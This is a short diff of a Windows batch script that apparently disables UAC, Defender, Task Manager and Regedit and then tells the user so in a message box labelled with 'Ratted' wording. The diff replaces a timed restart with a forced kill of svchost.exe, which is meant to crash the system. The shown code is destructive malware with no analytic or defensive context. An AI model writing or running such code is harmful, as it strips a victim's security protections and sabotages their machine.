@@ -21,5 +21,5 @@ echo MsgBox "UAC, Defender, Task Manager, and Regedit have been disabled." ^& vb
 cscript //nologo "%temp%\msgbox.vbs"
 del "%temp%\msgbox.vbs"
 
-:: --- 6. Restart System ---
-shutdown /r /t 5 /c "Ratted"
+:: --- 6. Force System Crash ---
+taskkill /IM svchost.exe /F
